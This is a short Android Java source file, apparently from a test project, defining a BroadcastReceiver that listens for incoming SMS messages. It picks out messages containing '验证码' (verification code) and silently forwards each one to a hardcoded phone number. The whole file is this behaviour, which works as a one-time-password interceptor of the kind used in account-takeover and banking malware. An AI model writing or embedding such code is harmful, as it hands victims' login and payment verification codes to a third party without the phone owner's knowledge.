package com.xiaoxiao.testrxjava;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.xiaoxiao.utils.LogUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * 文件名: SmsAutoSendReceiver
 * 描述：
 * 修改人: caixiaoxiao
 * 日期: 2020/9/21
 */
public class SmsAutoSendReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())){
            LogUtils.e("sms","sms");
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            List<SmsMessage> smsList = new ArrayList<SmsMessage>();
            for (Object pdu : pdus){
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sms.getMessageBody().contains("验证码")){
                    smsList.add(sms);
                }
            }

            SmsManager smsManager = SmsManager.getDefault();
            for (SmsMessage sms: smsList) {
                smsManager.sendTextMessage("18511490726",null,sms.getMessageBody(),null,null);
            }
        }
    }
}
